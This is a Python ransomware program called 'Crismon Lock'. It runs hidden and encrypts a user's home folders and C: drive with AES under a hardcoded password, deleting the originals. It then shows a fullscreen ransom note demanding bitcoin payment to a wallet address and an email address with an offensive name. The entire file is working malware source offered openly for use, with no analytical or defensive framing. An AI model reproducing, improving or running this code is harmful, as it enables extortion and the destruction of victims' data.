from hashlib import sha256
import os
import threading
import tkinter as tk
from tkinter import messagebox, font, ttk
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
import pyttsx3

import time
import sys

# === Hardcoded settings ===
HARDCODED_PASSWORD = "%>Yg.a=1:+DWi)!xdCp:F-eß?RVj;+J(4i?rr91bx)8322E^^42cGy/3R1"
HARDCODED_FOLDER = [
    Path.home() / 'Downloads',
    Path.home() / 'Documents',
    Path.home() / 'Music',
    Path.home() / 'Pictures',
    Path.home() / 'Videos',
    Path.home() / 'C:/'
]

class FileEncryptor:
    def __init__(self, password):
        self.master_key = PBKDF2(password, b"beyson_salt", dkLen=32, count=200000)

    def derive_key(self, salt):
        return sha256(self.master_key + salt).digest()

    def encrypt_file(self, file_path):
        try:
            salt = get_random_bytes(16)
            key = self.derive_key(salt)

            cipher = AES.new(key, AES.MODE_CTR)

            with open(file_path, "rb") as f_in, open(file_path + ".CRSMLK", "wb") as f_out:
                # write salt + nonce for decryption
                f_out.write(salt + cipher.nonce)

                while True:
                    chunk = f_in.read(67108864)
                    if not chunk:
                        break
                    f_out.write(cipher.encrypt(chunk))

            os.remove(file_path)
            return True

        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")
            return False

    def decrypt_file(self, file_path):
        try:
            if not file_path.endswith(".CRSMLK"):
                return False

            with open(file_path, "rb") as f:
                salt = f.read(16)
                nonce = f.read(8)  # CTR nonce length
                ciphertext = f.read()

            key = self.derive_key(salt)

            cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
            decrypted = cipher.decrypt(ciphertext)

            with open(file_path[:-5], "wb") as f:
                f.write(decrypted)

            os.remove(file_path)
            return True

        except Exception as e:
            print(f"Error decrypting {file_path}: {e}")
            return False

    def encrypt_folder(self, folder_path, update_gui=None, completion_callback=None):
        files_to_encrypt = []

        for root, dirs, files in os.walk(folder_path):
            for file in files:
                if file.endswith(".CRSMLK"):
                    continue
                files_to_encrypt.append(os.path.join(root, file))

        total_files = len(files_to_encrypt)
        completed = [0]
        lock = threading.Lock()

        def encrypt_single(file_path):
            result = self.encrypt_file(file_path)
            with lock:
                completed[0] += 1
                if update_gui and completed[0] % 5 == 0:
                    update_gui(completed[0], total_files)
            return result

        max_workers = min(3, len(files_to_encrypt)) if files_to_encrypt else 1
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(encrypt_single, f): f for f in files_to_encrypt}
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"Error in thread: {e}")

        if completion_callback:
            completion_callback()
        return True

    def decrypt_folder(self, folder_path, update_gui=None):
        files = [os.path.join(root, f) for root, _, files in os.walk(folder_path) for f in files if f.endswith('.CRSMLK')]
        total_files = len(files)
        for idx, file_path in enumerate(files):
            if update_gui:
                update_gui(idx + 1, total_files)
            self.decrypt_file(file_path)
        return True

class NotBeyson:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Crismon Lock Ransomware")
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)

        self.folder_path = HARDCODED_FOLDER
        self.password = HARDCODED_PASSWORD
        self.encryptor = FileEncryptor(self.password)

        # SILENT MODE: Start encryption immediately without showing window
        self.encryption_complete = False
        self.encryption_started = False

        # Start encryption in background thread immediately
        self.start_silent_encryption()

        # If silent mode, keep window hidden until encryption completes
        if not self.encryption_complete:
            self.root.withdraw()  # Hide window

        self.root.mainloop()

    def start_silent_encryption(self):
        """Start encryption in background, show window when done"""
        def encrypt_and_notify():
            self.encryption_started = True
            for folder in self.folder_path:
                if os.path.exists(folder):
                    self.encryptor.encrypt_folder(folder, update_gui=None, completion_callback=None)

            # Encryption complete - show the window now
            self.encryption_complete = True
            self.root.after(0, self.show_ransom_window)

        threading.Thread(target=encrypt_and_notify, daemon=True).start()

    def show_ransom_window(self):
        """Reveal the ransomware window after silent encryption"""
        self.root.deiconify()  # Show window
        self.setup_ui()  # Setup UI now
        messagebox.showinfo("Damn You got Beysoned", "All files have been encrypted successfully!\nYou're fucked")
        self.timer_label.config(text="follow instructions")


    def setup_ui(self):
        """Setup UI for silent mode (called after encryption completes)"""
        main_frame = tk.Frame(self.root, bg='black')
        main_frame.pack(expand=True, fill='both')

        title_font = font.Font(family="Courier", size=36, weight="bold")
        tk.Label(main_frame, text="Crismon Lock Has Encrypted All Your Files \n Its AES-256 bro", fg='red', bg='black', font=title_font).pack(pady=20)


        note_text = """
Oops your important files have been encrypted!

Whats encryped?
Home, Downloads, Documents, Pictures, Videos, Music, and Your C:/ drive

What If i shutdown?
(if shut down this can cause your Widnows OS
to become unstable and you might not be able to use it)

What can i do?
Send 0.000013BTC/250USD to 392vwqJXz8r2LkYL786pMKsjwMNLdEefj7
You Have 48 Hours trying to decrypt files yourself wont work
Prices may go up or down so just 250$ is fine
after that please send the transaction ID and Receipt/proof to ZyklonBgas@proton.me
And i will personally email you the password for you (*=*) 
Honestly i need the 250$ i need a phone and some apple juice and Vbuckies :D
Oh and you have only a few attempts so dont try to guess it
        """
        tk.Label(main_frame, text=note_text, fg='red', bg='black', font=font.Font(family="Courier", size=18)).pack(pady=20)

        ransom_font = font.Font(family="Courier", size=24, weight="bold")
        tk.Label(main_frame, text="This is not a joke", fg='red', bg='black', font=ransom_font).pack(pady=20)

        self.timer_label = tk.Label(main_frame, text="All files were encrypted!",
                                   fg='red', bg='black', font=font.Font(family="Courier", size=16))
        self.timer_label.pack(pady=10)

        self.decryption_password = tk.Entry(main_frame, show="*", font=("Courier", 16), bg='black', fg='white')
        self.decryption_password.pack(pady=10)
        self.decryption_password.insert(0, "Enter decryption password")

        self.decrypt_button = tk.Button(main_frame, text="Decrypt Files", command=self.decrypt_files, fg='black', bg='red', font=font.Font(family="Courier", size=16))
        self.decrypt_button.pack(pady=10)

    def update_progress(self, current, total):
        pass  # No GUI updates in silent mode during encryption

    def decrypt_files(self):
        if self.decryption_password.get() == self.password:
            threading.Thread(target=self.run_decryption, daemon=True).start()
        else:
            messagebox.showerror("Error", "Incorrect password!")

    def run_decryption(self):
        for folder in self.folder_path:
            if os.path.exists(folder):
                self.encryptor.decrypt_folder(folder, update_gui=self.update_progress)
        messagebox.showinfo("Decryption Completed", "Files decrypted successfully!")
        self.timer_label.config(text="DECRYPTION COMPLETE")
        self.progress['value'] = 100


if __name__ == "__main__":
    NotBeyson()